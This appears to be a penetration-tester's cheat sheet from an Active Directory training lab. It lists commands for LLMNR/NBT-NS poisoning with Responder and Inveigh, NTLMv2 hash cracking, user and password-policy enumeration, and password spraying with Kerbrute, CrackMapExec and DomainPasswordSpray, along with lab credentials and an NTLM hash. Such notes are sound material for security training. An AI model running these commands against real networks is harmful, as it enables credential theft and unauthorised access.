### **Basic steps**
1. Start Wireshark: `sudo -E wireshark`
2. Tcpdump Output: `sudo tcpdump -i ens224 `
3. Use Responder: `sudo responder -I ens224 -A `
4. FPing Active Checks: `fping -asgq 172.16.5.0/23`
5. Nmap Scanning: `sudo nmap -v -A -iL hosts.txt`

### **Identifying Users with [Kerbrute](https://github.com/ropnop/kerbrute)**
```bash
sudo git clone https://github.com/ropnop/kerbrute.git`
sudo make all
./kerbrute_linux_amd64 
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
### **LLMNR/NBT-NS Poisoning - from Linux**
1. Run Responder: `sudo responder -I ens224 `
2. Cracking an NTLMv2 Hash With Hashcat: `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt`
### ** LLMNR/NBT-NS Poisoning - from Windows**
1. Inveigh
    1. `Import-Module .\Inveigh.ps1`
    2. `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`
2. C# Inveigh (InveighZero): `.\Inveigh.exe`
### **Enumerating the Password Policy - from Linux - Credentialed**
1. CME: `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol`
2. RPCClient:
    1. `rpcclient -U "" -N 172.16.5.5`
    2. `querydominfo`
3. Enum4linux: `enum4linux -P 172.16.5.5`
4. Enum4linux-ng: `enum4linux-ng -P 172.16.5.5 -oA ilfreight`
### **Enumerating Null Session - from Windows**
1. Establish a null session from windows: `net use \\DC01\ipc$ "" /u:""`
2. Common errors when trying to authenticate:
    1. `net use \\DC01\ipc$ "" /u:guest` System error 1331 has occurred. This user can't sign in because this account is currently disabled.
    2. `net use \\DC01\ipc$ "password" /u:guest`
        1. System error 1326 has occurred. The user name or password is incorrect.
        2. System error 1909 has occurred. The referenced account is currently locked out and may not be logged on to.
### **Enumerating the Password Policy - from Linux - LDAP Anonymous Bind**
1. Ldapsearch: `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`
2. 
### **Enumerating the Password Policy - from Windows**
1. Using net.exe: `net accounts`
2. Using PowerView: `Get-DomainPolicy`
### **Password Spraying - Making a Target User List**
1. Using enum4linux: `enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`
2. Using rpcclient: 
    1. `rpcclient -U "" -N 172.16.5.5`
    2. `enumdomusers`
3. Using CrackMapExec --users Flag: `crackmapexec smb 172.16.5.5 --users`
4. Gathering Users with LDAP Anonymous:
    1. Using ldapsearch: `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "`
    2. Using windapsearch: `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`
5. Kerbrute User Enumeration: `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt `
6. 
### **Credentialed Enumeration to Build our User List**
1. CME: `sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users`
### **Internal Password Spraying - from Linux**
1. Using a Bash one-liner for the Attack: `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
2. Using Kerbrute for the Attack: `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`
3. Using CrackMapExec & Filtering Logon Failures: `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`
4. Validating the Credentials with CrackMapExec: `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`
5. Local Admin Spraying with CrackMapExec: `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`
### **Internal Password Spraying - from Windows**
1. Using [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray): 
    1. `Import-Module .\DomainPasswordSpray.ps1`
    2. `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`
    
